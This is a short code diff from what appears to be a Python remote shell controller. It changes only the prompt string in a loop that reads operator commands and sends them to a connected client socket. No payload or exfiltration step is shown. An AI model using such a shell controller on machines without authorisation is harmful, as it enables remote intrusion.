@@ -8,7 +8,7 @@ def stream_shell(client_socket, client_hostname):
     print(f"{cl.green}[+] Starting shell session...{cl.reset}")
     try:
         while True:
-            cmd = shell_session.prompt(f"shell@{client_hostname}> ")
+            cmd = shell_session.prompt(f"shell@{client_hostname} $ ")
             if cmd.lower() == "exit":
                 send(client_socket, "exit_shell")
                 break
